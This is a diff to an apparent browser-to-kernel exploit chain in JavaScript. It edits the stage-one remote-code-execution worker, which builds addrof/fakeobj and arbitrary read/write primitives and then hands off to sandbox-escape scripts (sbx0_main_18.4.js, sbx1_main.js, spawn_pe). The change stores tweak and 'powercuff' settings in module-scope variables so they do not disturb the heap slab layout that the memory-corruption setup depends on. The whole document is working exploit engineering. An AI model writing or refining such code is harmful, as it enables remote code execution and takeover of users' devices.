@@ -1,6 +1,14 @@
 var SERVER_LOG;
 let offsets;
 let MessageName;
+// Module-scope vars for tweak/level passed in from rce_loader via the
+// stage1_rce postMessage. They persist across onmessage dispatches because
+// they live outside self.onmessage's execution context. They are NOT
+// promoted onto globalThis until just before sbx0_main_18.4.js eval, to
+// avoid adding heap allocations before the addrof/fakeobj setup loop in
+// _aarw_main -> setup_stage2_prim, which is sensitive to slab layout.
+var __ls_pending_tweaks = 'fiveicon';
+var __ls_pending_powercuff_level = 'heavy';
 
 const no_cow = 1.1;
 const unboxed_arr = [no_cow];
@@ -10177,6 +10185,13 @@ async function main() {
           }
           const rce_end = Date.now();
           log(`-`.repeat(0x28));
+          // Now that the exploit prims are fully set up and we are about to
+          // hand control to sbx0_main_18.4.js -> sbx1_main.js -> spawn_pe(),
+          // promote the module-scope tweak/level vars onto globalThis so the
+          // sbx1_main.js prelude builder in spawn_pe can read them.
+          try { globalThis.__ls_tweaks = __ls_pending_tweaks; } catch (e) { globalThis.__ls_tweaks = 'fiveicon'; }
+          try { globalThis.__powercuff_level = __ls_pending_powercuff_level; } catch (e) { globalThis.__powercuff_level = 'heavy'; }
+          log("[setup_fcall] tweaks=" + globalThis.__ls_tweaks + " level=" + globalThis.__powercuff_level);
           try {
                 const sbx0_script = getJS('/sbx0_main_18.4.js?' + Date.now());
                 log("after get js");
@@ -10200,9 +10215,15 @@ async function main() {
         {
             host = data.desiredHost;
             SERVER_LOG = data.SERVER_LOG;
-            try { globalThis.__ls_tweaks = (typeof data.ls_tweaks === 'string' && data.ls_tweaks.length > 0) ? data.ls_tweaks : 'fiveicon'; } catch (e) { globalThis.__ls_tweaks = 'fiveicon'; }
-            try { globalThis.__powercuff_level = (typeof data.ls_powercuff_level === 'string' && data.ls_powercuff_level.length > 0) ? data.ls_powercuff_level : 'heavy'; } catch (e) { globalThis.__powercuff_level = 'heavy'; }
-            print("inside stage1_rce from worker, tweaks=" + globalThis.__ls_tweaks + " level=" + globalThis.__powercuff_level);
+            // Stash tweak/level on module-scope vars (declared at the top of
+            // this file) instead of globalThis. They are read back later from
+            // case 'setup_fcall' right before sbx0_main_18.4.js eval. Module
+            // var slot overwrites do not create new globalThis property
+            // descriptors or hidden-class transitions, so the slab layout
+            // that _aarw_main -> setup_stage2_prim's addrof/fakeobj setup
+            // loop depends on stays undisturbed.
+            if (typeof data.ls_tweaks === 'string' && data.ls_tweaks.length > 0) __ls_pending_tweaks = data.ls_tweaks;
+            if (typeof data.ls_powercuff_level === 'string' && data.ls_powercuff_level.length > 0) __ls_pending_powercuff_level = data.ls_powercuff_level;
             main().then(async (p_temp) => {
               if(!p_temp.addrof)
               {
